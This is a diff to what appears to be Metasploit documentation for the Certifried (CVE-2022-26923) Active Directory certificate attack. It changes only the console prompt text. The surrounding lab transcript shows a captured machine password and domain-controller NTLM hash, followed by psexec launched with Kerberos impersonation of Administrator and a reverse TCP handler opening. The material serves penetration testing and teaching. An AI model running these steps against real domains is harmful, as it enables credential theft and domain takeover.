@@ -124,7 +124,7 @@ user set in the `IMPERSONATE` option (default is `Administrator`).
 
 ### Windows Server 2019 Domain Controller with ADCS installed
 ```msf
-msf6 auxiliary(admin/dcerpc/cve_2022_26923_certifried) > run verbose=true rhosts=192.168.100.104 username=Test password=123456 domain=mylab.local dc_name=DC02 ca=mylab-DC02-CA
+msf auxiliary(admin/dcerpc/cve_2022_26923_certifried) > run verbose=true rhosts=192.168.100.104 username=Test password=123456 domain=mylab.local dc_name=DC02 ca=mylab-DC02-CA
 [*] Running module against 192.168.100.104
 
 [*] 192.168.100.104:445 - Requesting the ms-DS-MachineAccountQuota value to see if we can add any computer accounts...
@@ -169,7 +169,7 @@ msf6 auxiliary(admin/dcerpc/cve_2022_26923_certifried) > run verbose=true rhosts
 [!] 192.168.100.104:445 - Unable to delete the computer account, this will have to be done manually with an Administrator account (Could not delete the computer DESKTOP-E0SYYS6U$: Error returned while deleting user in SAM server: (0xc0000022) STATUS_ACCESS_DENIED: {Access Denied} A process has requested access to an object but has not been granted those access rights.)
 [*] 192.168.100.104:445 - Disconnecting SMB
 [*] Auxiliary module execution completed
-msf6 auxiliary(admin/dcerpc/cve_2022_26923_certifried) > creds
+msf auxiliary(admin/dcerpc/cve_2022_26923_certifried) > creds
 Credentials
 ===========
 
@@ -178,7 +178,7 @@ host             origin           service        public             private     
 192.168.100.104  192.168.100.104  445/tcp (smb)  DESKTOP-E0SYYS6U$  4PuZlX57aULpEKXUZisjp227G0W0Rdvi                                   MYLAB        Password
 192.168.100.104  192.168.100.104  445/tcp (smb)  dc02$              aad3b435b51404eeaad3b435b51404ee:a93d16873c9d49be9b1bce4359dcaa6d  MYLAB.LOCAL  NTLM hash     nt,lm
 
-msf6 auxiliary(admin/dcerpc/cve_2022_26923_certifried) > loot
+msf auxiliary(admin/dcerpc/cve_2022_26923_certifried) > loot
 
 Loot
 ====
@@ -192,7 +192,7 @@ host             service  type                 name             content         
 
 ### Using `psexec` with the TGS impersonating the Administrator
 ```msf
-msf6 exploit(windows/smb/psexec) > exploit rhosts=192.168.100.104 lhost=192.168.100.1 smbuser=administrator smbdomain=mylab.local Smb::Auth=kerberos Smb::Rhostname=dc02.mylab.local DomainControllerRhost=192.168.100.104
+msf exploit(windows/smb/psexec) > exploit rhosts=192.168.100.104 lhost=192.168.100.1 smbuser=administrator smbdomain=mylab.local Smb::Auth=kerberos Smb::Rhostname=dc02.mylab.local DomainControllerRhost=192.168.100.104
 
 
 [*] Started reverse TCP handler on 192.168.100.1:4444
